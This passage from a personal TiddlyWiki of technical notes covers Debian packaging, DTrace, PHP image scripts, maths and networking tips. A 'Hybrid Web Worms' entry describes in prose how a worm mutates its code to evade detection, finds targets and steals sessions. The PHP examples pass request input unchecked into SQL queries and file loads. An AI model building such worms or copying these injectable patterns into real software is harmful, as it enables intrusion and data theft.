* ''config'': ask questions to send info to maintainer scripts 

!Source package format
* ''foo.dsc'' : overall control file containting a description and fields for build paarameters.
* ''foo.orig.tar.gz'' : original source code as proivded by upstream
* ''foo.diff.gz'' : all changes applied for debian

!!debian/rules
controsl how the package is built. Typically a makefile with multiple targets corresponding to varous stages of the build process:
* ''configure'': does pre-bild configuration such as running ./configure with apporopriate options.
* ''build'': compiles the package from the source
* ''install'': copies/moves file sfrom their build destination into the installation tree
* ''binary, binary-arch and binary-indep'': create the binary packages, typically calls -arch and -indep
* ''clean'': return the package to the pre-build state

!Building a deb file from a source tar ball
{{{
# ls 
tcpdump-3.9.4.tar.gz
# tar zxf tcpdump_3.9.4.tar.gz
# cd tcpdump_3.9.4
# dh_make -e blabla@blabla.org -f ../tcpdump-3.4.9.tar.gz
# cd debian 
# vim Control
####### make modifications as necessary here
# vim rules
#### edif if necessary
# cat dirs
# dpkg-buildpackage
}}}

!To find files installed by a package
{{{
# dpkg -i tcpdump
/usr
/usr/sbin
/usr/sbin/tcpdump
/usr/share
.....
}}}


</pre>
</div>
<div title="DefaultTiddlers" modifier="BhargavaKancherla" modified="200801151442" created="200801110827" changecount="5">
<pre>Tips</pre>
</div>
<div title="Dtrace" modifier="BhargavaKancherla" created="200807151012" changecount="1">
<pre>Dtrace is SUN solaris tool to help instrument the operating system at runtime without changing the operating system code. 

{{{
dtrace -l 
}}}
lists all the probes that are allowed to be captured. There are more than 50000 probes available in solaris. 

!Providers
Provider are modules which can proivde probes. 
Ex:

{{{
ID	PROVIDER	MODULE			FUNCTION NAME
.
.
.
5	syscall					munmap	 return
6 	syscall				     fpathconf   entry

}}}
Each provider knows how to instrument a certain part of the system.  here syscall is provider which can instrument entry and exit for every system call. The fbt provider knows how to instrument each entry and return of every kernel function.

''MODULE'' denotes the kernel module or for user probe user level module. 

Probes can listed as ''PROVIDER:MODULE:FUNCTION:NAME''. So to list all probes from provider syscall with name entry would be

{{{
dtrace -l -n syscall:::entry
}}}

To instrument the system 

{{{
# dtrace -n syscall:::entry
0    529 		pollsys:entry
0    529 		  ioctl:entry
...
}}}

To see which is program which is responsible for a certain probe
{{{
# dtrace -n syscall:::entry'{trace(execname)}'
}}}

Aggregation of probes
{{{
# dtrace -n syscall:::entry'{#[execname] = count()}'
}}}
 
Predicates 
{{{
#  dtrace -n syscall:::entry'/execname == &quot;trashapplet&quot;/{#[probefunc] = count()}'
}}}

multiple elements based aggregation
{{{
#  dtrace -n syscall:::entry'/execname == &quot;trashapplet&quot;/{#[probefunc, pid] = count()}'
}}}

stack trace
{{{
#  dtrace -n syscall:::entry'/execname == &quot;trashapplet&quot;/{#[ustack] = count()}'
}}}

process instrumentation
{{{
# dtrace -n pid100092::XPending:entry 
}}}

timestamp 
{{{
# dtrace -n pid100092::XPending:entry'{printf(&quot;Called XPending at %Y\n&quot;, walltimestamp)}' -q
}}}

example d-script
{{{
#!/usr/sbin/dtrace -s

pid100092::XPending:entry
{
	self-&gt;follow = 1;
}

pid100092:::entry,
pid100092:::return
/self-&gt;follow/
{}

pid100092::XPending:return
/self-&gt;follow/
{
	self-&gt;follow = 0;
	exit(0);
}	

}}}

</pre>
</div>
<div title="Dynamic Images" modifier="BhargavaKancherla" modified="200801161025" created="200801161019" changecount="4">
<pre>You can pull an image from a database 

{{{
&lt;img src=&quot;show_img.php?id=34&quot;&gt;
}}}

{{{
&lt;?php
# show_img.php
// Get image (blob) from database
include(&quot;mysql_library.php&quot;);
$id = $_GET['id'];
$sql = &quot;select IMAGE from parts where ID = '$id'&quot;;
$img = execute_sql($sql);

//Send Image to the browser
header(&quot;Content-type: image/jpeg&quot;);
echo base64_decode($img);
exit;
?&gt;
}}}

You can select an image to display like this
{{{
&lt;img src=&quot;show_img.php?id=puppy.jpg&quot;);
}}}

{{{
&lt;?php
# show_img.php
// Create (send to browser) mime type for a jpeg image
header(&quot;Content-type: image/jpeg&quot;);

// Create an image handle from an actual JPG image
$im = @imagecreatefromjpg($_GET['id']);

// Create an image from the handle and send to browser
imagejpg($im);

// Destroy the old image (no longer needed)
imagedestroy($im);

// Execute an exit to ensure file execution is over 
exit;
?&gt;
}}}

You can create dynamic content
{{{
&lt;img src=&quot;show_time.php&quot;&gt;
}}}

{{{
&lt;? 
$image = imagecreate($width=750, $height=800);
$bgcolor = imagecolorallocate ($image, 0, 0, 0);
$fgcolor = imagecolorallocate ($image, 255, 255, 255);

// write the time
$font = imageloadfont (&quot;anonymous.gif&quot;);
imagestring($image, $font, 20, 240, date(&quot;r&quot;, time()), fgcolor);

// send image to the browser
header('Content-type: image/jpeg');
imagejpeg($image);

imagedestroy($image);
exit;
?&gt;
}}}


  </pre>
</div>
<div title="Ethereal" modifier="YourName" modified="201003241053" created="201003241050" changecount="3">
<pre>[[NFSEthereal]]

!Ethereal cooked capture
Cooked capture when capture is done over '-i any' device. 

http://www.ethereal.com/lists/ethereal-users/200412/msg00314.html
&lt;&lt;&lt;
On Linux, packet capturing is done by opening a socket. In systems with a 2.2 or later kernel, the socket is a PF_PACKET socket, either of type SOCK_RAW or SOCK_DGRAM.

A SOCK_RAW socket supplies the packet data including what the driver specified, when constructing the socket buffer (skbuff) holding the packet, to be the packet's link-layer header; a SOCK_DGRAM packet supplies only data above what was specified by the driver to be the link-layer header.

For the purposes of libpcap, which is the library used by programs such as tcpdump, Ethereal/Tethereal, snort, etc. to capture network traffic, a SOCK_RAW socket is usually the appropriate type of socket on which to capture, and is what's used.

Unfortunately, the purported link-layer header might be missing (as is the case for some PPP interfaces), or might contain random unpredictable amounts of data (as is the case for at least some interfaces using ISDN), or might not contain enough data to determine the type of the packet (as is the case with at least some ATM interfaces), so capturing with a SOCK_RAW socket doesn't always work well.

For interfaces of those types - and for interfaces of a type that libpcap currently doesn't have code to support - libpcap uses a SOCK_DGRAM socket, and constructs a fake link-layer header from the address supplied by a &quot;recvfrom()&quot; on that socket.

A &quot;Linux cooked capture&quot; is one done with libpcap using a SOCK_DGRAM socket.
&lt;&lt;&lt;

!Links
http://danielmiessler.com/study/tcpdump/
</pre>
</div>
<div title="Fermat's theorem" modifier="BhargavaKancherla" created="200807151013" changecount="1">
<pre>!Generating Pythageron Triples
2st
s^^2^^+t^^2^^
s^^2^^-t^^2^^

!Fermat's Theorem
x^^n^^+y^^n^^=z^^n^^ does not exist for n &gt; 2

!Proof of the theorem for n = 4

x^^4^^ + y^^4^^ = z^^2^^
(x^^2^^)^^2^^ + (y^^2^^)^^2^^ = z^^2^^
x^^2^^ = 2st  y^^2^^ = s^^2^^-t^^2^^  z = s^^2^^ + t^^2^^

s^^2^^ =  y^^2^^ + t^^2^^

s = u^^2^^ + v^^2^^  y = u^^2^^ - v^^2^^   t = 2uv

x^^2^^ = 4suv

s, u, v do not have any common factors
s u v are perfect squares

s = e^^2^^  u = f^^2^^  v = g^^2^^

e^^2^^ = f^^4^^ + g^^4^^

We have proven that thare are 3 other numbers e,f,g which can again follow this property, and since that can't go on this forever, this assumption invalied


</pre>
</div>
<div title="Fibonnaci" modifier="BhargavaKancherla" modified="200807160609" created="200807151014" changecount="5">
<pre>!fibonnaci
1 1 2 3 5 8 13 21

!fibonnaci in nature
sprials on any fruit or flowers are fibonnaci numbers
Any number can be expressed as a sum of fibonnaci numbers without any repititions
45 = 34 + 8 + 3

!fibonnaci with different seeds
2 1 3 4 7 11 18 29 ...

!Generating fibonnaci number
4th + 5th = 6th
2*5th - 3th = 6th
5th*5th (+ or -) 1 = 4th * 6th


!Golden Ratio
Ratio of 2 consecutive fibonnaci numbers converges to 1.61803 as a fraction 1 + sqrl(5)  whole divide / 2. Derived using x = 1 + (1 / (1+x)).
No matter what the starting seeds the ratio also converges to golden ratio

!Golden Rectangle
Golden rectangle's ratio of length/breadth is the golden ratio. To draw a golden rectangle take a square extend its a base. Take the midpoint of the base and draw an arc with the length of the midpoint to the top corner and cut the base at that distance. If we extend the square to this point to form a rectangle it is an golden rectangle. 

[img[images/construct.golden.rectangle.png]]

If we consider the side of square as 2x. The triangle formed with midpoint and vertical side is right triangle with base x and height 2x. The hypotenuse is x*sqrt(5), which is the length of the arc that we have drawn. Now when we extend this square to a rectangle the base becomes x + x*sqrt(5). The ratio comes down as the golden ratio. And this triangle is also called golden triangle

!Golden Triangle
Right-angled triangle with height twice of base. 5 pieces of golden triangle can be used to a larger golden triangle with base sqrt(5) times the original base. This is only triangle which has this property. Ordinary triangles can be created with 4 pieces of similar triangles. 

[img[images/golden.triangle.png]]

!Generating a spiral from Golden Rectangles
Take a golden rectangle, cut a square out of the rectangle with the side of height. This would again result in another rectangle. If the original rectangle base is (sqrt(5) + 1), and height 2. When we cut a square of side 2. we end with base of sqrt(5) + 1 - 2 = sqrt(5) -1  and base 2. This when we multiply with sqrt(5) + 1 on both numeritor and denominator we would endup with golden ratio. This is the only rectangle which has this property of being able to generate similar rectangle when a square is cut from it. 

When the try to goin corners of these rectangles with a smooth arc we generate a spiral. 

[img[images/fibonnaci.spiral.png]]



</pre>
</div>
<div title="Google Search Tips" modifier="BhargavaKancherla" modified="200801151434" created="200801141018" changecount="1">
<pre>!Google Search Tips

''//patrick norton -ziff davis//''
*will give search results with 'patrick norton' in the page and 'ziff davis' not in the page.

''//Patrick-norton //''= patrick norton

''//+oper labs//''
*will give search results with 'oper labs' instead of automatic spell checking and results which contain 'opera labs'

''//time in india//''
* will show the current time in india
''//log 5.0 x 106//'' or ''//5*8//''
* can perform simple mathematical operations
''//five dollars in yen//''
* can perform currency conversions
''//define:collegial//''
* will give the definition of //collegial// from different locations
''//civil war filetype:ppt//''
* will try to return results in files of type //ppt// which contain civil war

''//mount everest is * feet high//''
* use * to fill in blanks
''//mt everest base camp 10000..20000//''
* number range support
''//dvd player $100..300//''
* currency range support
''//video cards site:dl.tv//''
* try to avoid www or site:com
''//~restoration//''
* will also return results with synonyms 
''//movie:bell tower fall//''
* will return movies whose description contains bell tower fall

''//intitle:test//''

''//allintitle:test results//''

''//inurl:test//''

''//allinurl: test results//''

''//allintext:test results//''
* Returns only pages that contain your search terms, but not links to those pages
''//allinanchor:test results personality//''
* Returns only pages that link to  pages  with your search terms, but not in the  actual pages.

also visit google web search features in http://www.google.com/about.html
search engine showdown http://searchengineshowdown.com/</pre>
</div>
<div title="Hack Technique Links" modifier="BhargavaKancherla" modified="200807071109" created="200801140835" changecount="3">
<pre>!Hack techniques links

~JavaScript/CSS history hack
http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html

Online demo of CSS History Hack
http://ha.ckers.org/weird/CSS-history-hack.html

Common intranet hostnames
http://ha.ckers.org/fierce/hosts.txt

Steal Browser Histtory without ~JavaScript
http://ha.ckers.org/blog/20070228/steal-browser-history-without-javascript/

Online demo of CSS History Hack Without ~JavaScript
http://ha.ckers.org/weird/CSS-history.cgi

My Address Java Applet
http://reglos.de/myaddress/MyAddress.html

Hacking Intranet Websites from Outside
http://jeremiahgrossman.blogspot.com/2006/09/video-hacking-intranet-websites-from.html

Browser port scanning without ~JavaScript
http://jeremiahgrossman.blogspot.com/2006/11/browser-port-scanning-without.html

HTML Form Protocol Attack
http://www.remote.org/jochen/sec/hfpa/index.html

Mozilla Port Blocking
http://www.mozilla.org/projects/netlib/PortBanning.html

</pre>
</div>
<div title="Hard Disk Recovery" modifier="BhargavaKancherla" modified="200807071147" created="200806260908" changecount="5">
<pre>If you do not have an extra hard disk or laptop where you could plugin the faulty disk for recovery and just want to retrieve your data ASAP you could try using Trinity. Trinity Rescue Kit or TRK is a free live Linux distribution that aims specifically at recovery and repair operations on Windows and Linux machines.

The iso image can be downloaded from http://trinityhome.org/

You might have to refer a couple of man pages before this works but the short procedure would be. Boot using the rescue CD, it obtains network ip using dhcp so you should have nfs/ssh access to the server on which you want to backup your disk. Use ddrescue to recover as much of the corrupted disk as possible. Alternately you could mount the ntfs partition and retrieve the files you want.
</pre>
</div>
<div title="Hash in Shell Scripts" modifier="BhargavaKancherla" created="200807151014" changecount="1">
<pre>{{{
where n=&quot;TEST&quot;

typeset val_${n}=3
}}}

the value of ${val_TEST} will be seen to be 3, checked using set or env. Reading the value is a little trickier. It can be performed directly if the key name is constant:

{{{
echo &quot;${val_TEST}&quot;
}}}

However, to use a variable key, perform the following:

{{{
echo &quot;$(eval echo \$val_${n})&quot;
}}}

This acts as a pointer and should then return 3.

In order to run the hash, set or env can be used along with a pattern matching utility, i.e. grep or egrep, especially if the variable name prefix is very specific (i.e. val_).
</pre>
</div>
<div title="Help Me" modifier="BhargavaKancherla" modified="200807170359" created="200801141016" changecount="4">
<pre>!tables
*sample:
|!th1111111111|!th2222222222|
|&gt;| colspan |
| rowspan |left|
|~| right|
|bgcolor(#a0ffa0):colored| center |
|caption|c
*another sample: see PeriodicTable.
For advanced effects, you can control the CSS style of a table by adding a row like this:
{{{
|cssClass|k
}}}

!Bullet Points
# Use a single '#' at the start of each line
# and the tiddler will automatically
# start numbering your list.
## If you want a sub-list
## within any bullets
## add two '#'s at the start of the lines.
# When you go back to a single '#'
# the main numbered list will start up
# where it left off.

Creating BulletPoints is simple.
* Just add an asterisk
* at the beginning of a line.
** If you want to create sub-bullets
** start the line with two asterisks
*** And if you want yet another level
*** use three asterisks
* Edit this tiddler to see how it's done

!Block Quotes
To make quoted bits of text stand out, you can use BlockQuotes within your [[tiddler]]s, like this:
JeremyRuston said:
&lt;&lt;&lt;
A TiddlyWiki is like a blog because it's divided up into neat little chunks, but it encourages you to read it by hyperlinking rather than sequentially: if you like, a non-linear blog analogue that binds the individual microcontent items into a cohesive whole.
&lt;&lt;&lt;

Like BulletPoints and NumberedBulletPoints, you can have multiple levels of BlockQuotes. Just edit this tiddler to see how it's done.

&gt;level 1
&gt;level 1
&gt;&gt;level 2
&gt;&gt;level 2
&gt;&gt;&gt;level 3
&gt;&gt;&gt;level 3
&gt;&gt;level 2
&gt;level 1

!Mono Space Text
{{{
var posTop = findPosY(e);
var posBot = posTop + e.offsetHeight;
var winTop = findScrollY();
var winHeight = findWindowHeight();
var winBot = winTop + winHeight;
if(posTop &lt; winTop)
return(posTop);
else if(posBot &gt; winBot)
{
if(e.offsetHeight &lt; winHeight)
return(posTop - (winHeight - e.offsetHeight));
else
return(posTop);
}
else
return(winTop);
}}}

!Extended Formatting
Like most wikis, TiddlyWiki supports a range of simplified character formatting:
| !To get | !Type this |h
| ''Bold'' | {{{''Bold''}}} |
| --Strikethrough-- | {{{--Strikethrough--}}} |
| __Underline__ | {{{__Underline__}}} (that's two underline characters) |
| //Italic// | {{{//Italic//}}} |
| Superscript: 2^^3^^=8 | {{{2^^3^^=8}}} |
| Subscript: a~~ij~~ = -a~~ji~~ | {{{a~~ij~~ = -a~~ji~~}}} |
| @@highlight@@ | {{{@@highlight@@}}} |
&lt;&lt;&lt;
The highlight can also accept CSS syntax to directly style the text:
@@color:green;green coloured@@
@@background-color:#ff0000;color:#ffffff;red coloured@@
@@text-shadow:black 3px 3px 8px;font-size:18pt;display:block;margin:1em 1em 1em 1em;border:1px solid black;Access any CSS style@@
&lt;&lt;&lt;

//For backwards compatibility, the following highlight syntax is also accepted://
{{{
@@bgcolor(#ff0000):color(#ffffff):red coloured@@
}}}
@@bgcolor(#ff0000):color(#ffffff):red coloured@@

!Images
{{{
[img[title|filename]]
[img[filename]]
[img[title|filename][link]]
[img[filename][link]]
}}}
Images can be included by their filename or full URL. It's good practice to include a title to be shown as a tooltip, and when the image isn't available. An image can also link to another tiddler or or a URL
[img[Romanesque broccoli|fractalveg.jpg][http://www.flickr.com/photos/jermy/10134618/]]
{{{
[img[Fractal vegetable|fractalveg.jpg]]
[img[This is shown as a tooltip|http://example.com/image.jpg]]
[img[http://example.com/image.jpg]]
[img[http://example.com/image.jpg][ExampleDotCom]]
}}}
The tooltip is optional.

[&lt;img[Forest|forest.jpg][http://www.flickr.com/photos/jermy/8749660/]][&gt;img[Field|field.jpg][http://www.flickr.com/photos/jermy/8749285/]]You can also float images to the left or right: the forest is left aligned with {{{[&lt;img[}}}, and the field is right aligned with {{{[&gt;img[}}}.
@@clear(left):clear(right):display(block):You can use CSS to clear the floats@@
{{{
[&lt;img[A woody bit of Hampstead Heath|forest.jpg]]
[&gt;img[A field near Milton Keynes|field.jpg]]
}}}

!Shortcuts
Access keys are shortcuts to common functions accessed by typing a letter with either the 'alt' (PC) or 'control' (Mac) key:
|!PC|!Mac|!Function|
|Alt-F|Ctrl-F|Search|
|Alt-J|Ctrl-J|NewJournal|
|Alt-N|Ctrl-N|NewTiddler|
|Alt-S|Ctrl-S|SaveChanges|
These access keys are provided by the associated internal [[Macros]] for the functions above. The macro needs to be used in an open tiddler (or the MainMenu or SideBar) in order for the access keys to work.

While editing a tiddler:
* ~Control-Enter or ~Control-Return accepts your changes and switches out of editing mode (use ~Shift-Control-Enter or ~Shift-Control-Return to stop the date and time being updated for MinorChanges)
* Escape abandons your changes and reverts the tiddler to its previous state

In the search box:
* Escape clears the search term

!Configuration

PageTemplate
|&gt;|&gt;|SiteTitle - SiteSubtitle|
|MainMenu|DefaultTiddlers&lt;&lt;br&gt;&gt;&lt;&lt;br&gt;&gt;&lt;&lt;br&gt;&gt;&lt;&lt;br&gt;&gt;ViewTemplate&lt;&lt;br&gt;&gt;&lt;&lt;br&gt;&gt;EditTemplate|SideBarOptions|
|~|~|OptionsPanel|
|~|~|AdvancedOptions|
|~|~|&lt;&lt;tiddler Configuration.SideBarTabs&gt;&gt;|

''StyleSheet:'' StyleSheetColors - StyleSheetLayout - StyleSheetPrint

!Comments
To hide text within a tiddler so that it is not displayed you can wrap it in {{{/%}}} and {{{%/}}}.
/%This text is not displayed
until you try to edit %/
!Plain Text
&lt;nowiki&gt;This is AnotherLink, this is a copyright symbol &amp;copy; and this site is called &lt;&lt;tiddler SiteTitle&gt;&gt;&lt;/nowiki&gt;
!Links
[[TiddlyWiki|http://www.tiddlywiki.com/]]
[img[MY Photo|myphoto.gif]]

!header sizes
to changes header size, edit the the 
{{{
h1 {font-size:1.6em;}
h2 {font-size:1.4em;}
h3 {font-size:1.2em;}
h4 {font-size:1em;}
h5 {font-size:.9em;}
}}}


</pre>
</div>
<div title="Hybrid Web Worms" modifier="BhargavaKancherla" modified="200807071119" created="200801140827" changecount="5">
<pre>!Hybrid Web Worms

Hybrid web worms attempt to overcome many of the limitations of web worms. A hybrid web worm is a worm that can run on both a web browser or a web server. This allows the hybrid web worm to take advantage of the enormous number of cross-site scripting vulnerabilities, but while allowing the same worm to utilise the rarer but morepowerful command execution vulnerabliity on a web server. These two differnet execution models are stored in the same worm and this allows hyrbid web worm to survive various situations. 

Alice visits infected.com and receives the ~JavaScript version of the hybrid web worm. The perl version of the worm lies dormant inisde the ~JavaScript version. The ~JavaScript code runs in Alice's browser and uses Alice's machine to exploit a command execution vulnerablility on site.com. The ~JavaScript version of the worm injects the Perl version of the worm (with a copy of ~JavaScript version inside) into site.com. On the web server hosting site.com the Perl code runs and injects the Perl version into another vulnerable web server other.com, this time located at other.com. When the code runs on the wbe server hosting other.com the hyrbid web worm wirtes the ~JavaScript version of itself into the web pages on other.com. When bob visits other.com the ~JavaScript version of the hybrid web worm is downloaded to his browser and the process continues. 

In addition to running in multiple environments, hybrid web worms also mutate their source code as they propogate to evade security systems or anti-virus programs. Hybrid worms can also update themselves with new vulnerabilities to exploit while in the wild. All of these features are designed to increase the lifespan of the worm. 

A hyrbid worm typically has more capabliites when running on a web server than when running on the client in a web server. For example, it may have access to native commands on the web server such as netstat or wget allowing it to easily conduct HTTP transactions with arbitary sites. It might also have access to full language interpreters such as Perl, PHP, Python or Ruby. 

Hyrbrid web worms attempt to evade detection from security products by mutating the source code to prevent all mutations of the code from containing a common signature. The source code from the hybrid worm is directly visible and this source code and all litreals are mutated with each infection.

A //reversable mutation// is a mutation which produces code that can be further mutated using some mutation function. A //final muatation// is a mutation whic produces code that cannot be mutated further using some mutation function. A security product could potentially create a signature for this final //stead-state// to detect malicious code. To prevent a final //steady-state// of the code that cannot be further mutated it is paramount to minimize the number of //final mutation// algorithms in the hybrid worm. Assuming mutations are chosen with the same probability, the probability that the Nth generation of code can be mutated further is given by the formula
{{{
number of reversable mutations
--------------------------------    power of N
Total number of mutations
}}}
For example, if you had five mutation functions, four which were reversible and one which was final, then after 14 generations a sample of code has only a 4% chance of mutating further.

Another concern when mutating code is increasing the size of successive genrations. If mutations only increase the lenght of the malware will grow without size, inhibiting its ability to effectively transport itself from host to host. There must be a corresponding mutation that can unde these size increases to prevent the soruce from growing without bounds. In general mutations would be throttled to ensure too much code does not change too quickly to ensure maximum diversity.

!Control flow structures

Control from sturctures like do-while, while and for can be mutated interchangeably. if, while and switch can also be mutated interchangeably. But there are no mutations to convert a code block into a do..while loop. This means any do..while loops in the original source code will quickly be mutated away.

!Literal Expansion and Collapsing

The mutation engine will expand and collapse string or numeric literals. For example a literal string such as as &quot;spi dynamics&quot; can be broken into pieces and concatenated together such as &quot;spi dy&quot;+&quot;namics&quot; or &quot;spi dynami&quot;+&quot;ics&quot;. It should be noted that each time a string literal is expanded using this method overall length of the worm increase by 3 character for the additional &quot;+&quot;. Another option is to convert a string literal into a sequence of character codes such as String.fromCharCode(115,112,105,32,100,121,110,97,109,105,99,115). This is beneficial it converts string literals into numeric literals which can be mutated into more forms than string literals. 

Numeric literals offer many opportunity for mutation. First of all literals can be represented using various number bases such as decimal, octal or hexadecimal. Numerical literals can be expanded much like string literals by performing two mathematical operations which cancel each other out. 

Collapsing code must also be written which is capable of detecting the literal expansions and collapsing them back into the original form.  

!Variable Renaming

Another obvious mutation is to change all the variable and function names. However, unless the word generating algorithm is desinged with care detectable artifacts can be introduced into the hybrid web worm. A common idea is to simply random select letters. Simple cryptographic analysis could be used to find variables that were randomly generated without any thought to letter selection.

Another viable method involves using the words on the web page the hybrid worm is injected into. 

!Inserting Non-code Element

Inserting random whitespace or comments to evade signature based detection mechanisms. Not much useful as language toeknizers will ignore them. 

!Other Possible Mutations

Other possible mutations include adding a do-nothing code such as If (false) {...}, (x OR 0), or (x AND x) and detecting/removing it without potentially altering the original code functionality is difficult is difficult without complex language toeknizing and parsing code. 

Mutation is not just lmited to interchangeable logic structures but also spans to communictaion functions. For example, the hybrid web worm might use an Image  object to send data to back to an attacker. This can be mutated to using an OBJECT tag or FORM tag in later generations. 

!Updating Attack Vectors

All worms have a pool of exploitable systems. This pool is defined by the number of hosts vulnerable to a given vulnerability, the ease of discovering those hosts, and whether those hosts are reachable from infected hosts. Worms which exploit a single vulnerability have a smaller pool of potentially infectabel machines that worms which exploit multiple vulnerabilities. 

There are two ways the hybrid worm can learn about new attack vectors while in the wild
#by retreiving information on known vulnerabilities from a public website
#independently discovering the unknown vulnerablities themselves

!Fething New, Known Vulnerablites

Many neutral(non-attacker controlled) websites publish information about new application vulnerablities in standardised format. Worms can read from these soruces to update their vulnerability list.

Another potential source of vulnerablities are defacer //score board// style sites such as ~Zone-H or xseed.com. These sites list specific websites that are vulnerable an dthe attack stirng used to exploit them. This is a much more explicit description of the attack vector allowing the hybrid web  wrom to know exactly where to insert its attack payload. While this allows the hybrid web worm to exploit  specific sites it is less helpful for the long term survivability of the worm than attack vectors disclosed for against a common component present on multiple sites. 

Another source of attack vectors would be for an attacker to manually publish machine consumable vulnerability information on multiple public and highly mirrored mailing lists. this provides a best of both worlds scenarios in the attacker can supply the hybrid web worm with new and very specific attack vector information wihout needin ga single bottleneck website they control that can be blocked.

!Discovering New Vulnerabilites

The hybrid could also attempt to find new vulnerabilities on its own using a a web vulnerability scanner. While on the server, the hybrid might be able to use nmap to find new targets on the web server's intranet and use 'Nikto' to find vulnerabilites to inject itself into. On the client the web vulnerability scanner //Jikto// could be used. Activities like port scanning and vulnerability scanning  can take large amounts of time, especially when done inside of an interpreted program running inside of a browser which has HTTP conenction limitations. Offline Ajax frameworks such as Google Gears provide a threading model to allow large ~JavaScript jobs to run wihtout interrption. This could make client-side scanning applicable in more situations. 

!Finding and Infecitng New Hosts

Methods a web worm can use to discover new hosts to infect in the wild
#port scanning for new targets
#retreiving a list of new targets from a conrtolling 3rd party (ala ~XSS-Proxy or Backframe) 
#querying search engines for newtargets

Due to ~JavaScript's Same Origin Policy, it is difficult for a hybrid worm to running on the client to query a search engine for new targets and be able to read the response. One of the methods bypassin g this is to use the cross domain communication method using 'proxy' websites first discovered by Petko Petkov and further refined by one of the authors for Jikto. This method has the added benefits of working cross-platform and cross-browser, does  not require special circumstances and does not rely on single mashup or API that could change without notice. 

The first step the hyrbid performs is creating an IFRAME pointed at site that provide proxy funcitonality. In the next step, the worm uses this IFRAME to download ~JavaScript from evil.com into the security domain of the proxy site. This allows the ~JavaScript to side-step the Same Origin Policy and use Ajax to contact the proxy site and send search requests to Google to find possible targets. Once these targets are located the hybrid web worm can then send blind GETS and POSTS to the target websites infecting with the new mutated copies of the hybrid web worm. 

So-called Google hacking provides a means for using search engines to find target websites that are running vulnerable versions of a specific web component. A query for 'Powered by XYZ version 4.1' is not enough. The Perl.Santy worm used Google to find websites running a vulnerable versions of phpBB. To avoid static detection by Google hybrid web worms update their attack vectors and also its search string. In addition, the hyrbrid worm adds a random number of random words to the query. 

The context of the hybrid worm dicatates the methods it can use to spread to other targets. When running on a client, the worm can use various methods such as large image object, various HTML tags, and the Iframes to send blind HTTP ~GETs and ~POSTs to other domains. Using a CSS and ~JavaScript the worm could determine which sites a user has visited or which sites they are looged into thus having a higher probability of leveraing cached login credential to propogate. When running on a server, command execution vulnerabilities attacks can load and execute full executables. Common methods would include using fopen, Perl:LWP , Sockets or any other available networ or file based functions. The server-side code can write the client-side version of itself into the webpages hosted on the web server.

!Worm Payloads

The payloads of web worm can vary depending on where the worm is executing. When execting on a client, all the nasty ~JavaScript techniques discovered in recent years, including session hijacking, port scanning, keystroke and mouse movement logging, theft of content, website history and search engine query theft. 

When execuitng on a server, more options are available. When exploiting a command Execution Vulnerabliity the hybrid worm can launch tools or commands on the target as the user id of the serivce infected. It is possible to leverage a local exploit to escalate to admin privileges. This can allow for kernel level backdoors to ensure the worms duration on the target. 


</pre>
</div>
<div title="Image Tips" modifier="BhargavaKancherla" modified="200801151434" created="200801141018" changecount="1">
<pre>''convert image from one file format to another of specific resolution.''
{{{
convert -resize 1024x768 &lt;inputfile&gt; &lt;outputfile&gt;
}}}

''Convert dot file to jpeg file.''
{{{
dot -Tjpg file.dot -o file.jpg
}}}

</pre>
</div>
<div title="Interface Fuzzing" modifier="BhargavaKancherla" modified="200807071120" created="200801140826" changecount="3">
<pre>!Interface Fuzzing

''Fuzzing'' is a technique that sends various different inputs into the test target. It may send malformed characters or special characters such as a single quote.

The result of fuzzing is usually analysed using two different approaches
#Signature analysis
#Behaviour analysis

''Signature analysis'' analyses the response to see whether anything in the reponse matches any of the known signatures that have been known to be indications that a vulnerability exists. 

''Behaviour analysis'' is looking for a particular string to appear in the response, this approach looks at the behaviour of the application. Are the results same as before ? How has the response changed? 

''Fuzzing'' is simply another term for interface robustness testing. Robustness testing often indicates security testing of user accessible interfaces, often called the ''attack surface''. 

''White box fuzzing'' indicates access to source code. Black-box indicates the ability to supply data to running program, but no source code. In Grey box while no access to source code is directly granted, it is possible to monitor the running executable in as much detail as a debugger and/or static binary analysis will permit.

</pre>
</div>
<div title="Intrusion Detection" modifier="BhargavaKancherla" modified="200807071113" created="200801140832" changecount="6">
<pre>!Network Intrusion Detection Systems (NIDS)

//''Web Application Firewalls''// (~WAFs), work by interfacing with the web server running the web application at the top level of the network stack, thus having the ability to analyzing encrypted data ( the web server performs the decryption) as well as HTTP meta data. 

//''Signature Based Systems''// (SBS) based on pattern matching engines, use a database containing signatures of well-known attacks to detect malicious activities. Attack patterns can be found in lict data, generating false positive alerts.

//''~Anamoly-Based systems''// (~ABSs) usually establish an ''ad hoc'' model describing the behaviour of the monitored system and flag any deviating activity as suspicious. Therefore these systems are able to detect new attacks as they take place, without any previous knowledge, however an extensive training phase is required to build the model and because of their nature, ~ABSs are well-known to generate a higher false positive rate than ~SBSs.

</pre>
</div>
<div title="Kernel Panic" modifier="BhargavaKancherla" modified="200807071151" created="200806260903" changecount="10">
<pre>!How to panic a kernel
echo &quot;1&quot; &gt; /proc/sys/kernel/kdb
echo &quot;1&quot; &gt; /proc/sys/kernel/sysrq
echo &quot;c&quot; &gt; /proc/sys/kernel/sysrq-trigger

!Path where dumps are stored
Typically machine will dump core upon panic and save it in a particular directory while rebooting.

''On Solaris:''
Dump directory =&gt; ''/var/crash/&lt;machine-name&gt;/{unix.nn, vmcore.nn}''

To see the panic string / stacktrace run ''adb'' or ''mdb''

{{{
#&gt; cd /var/crash/&lt;machine-name&gt;
#&gt; adb -k *.nn

$&lt;msgbuf
}}}


''On ~HP-UX:''
Dump directory =&gt; ''/var/adm/crash/&lt;crash.nn&gt;''

To see panic string you can check the INDEX file in the ''crash.nn'' directory or alternatively run ''p4'' or ''q4'' debugger.

{{{
#&gt;cd /var/adm/crash/crash.nn
#&gt;p4
p4&gt;Msgbuf
}}}</pre>
</div>
<div title="Link Aggregation" modifier="YourName" modified="200807020728" created="200807020659" changecount="1">
<pre>!Link Aggregation or Bonding
Bonding for link aggregation must be supported by both endpoints. Two linux machines connected via crossover cables can take advantage of link aggregation. A single machine connected with two physical cables to a switch which supports port trunking can use link aggregation to the switch. Any conventional switch will become ineffably confused by a hardware address appearing on multiple ports simultaneously. 

!!Load balancing mode
{{{
[root@real-server root]# modprobe  bonding
[root@real-server root]# ip addr add 192.168.100.33/24 brd + dev bond0
[root@real-server root]# ip link set dev bond0 up
[root@real-server root]# ifenslave  bond0 eth2 eth3
master has no hw address assigned; getting one from slave!
The interface eth2 is up, shutting it down it to enslave it.
The interface eth3 is up, shutting it down it to enslave it.
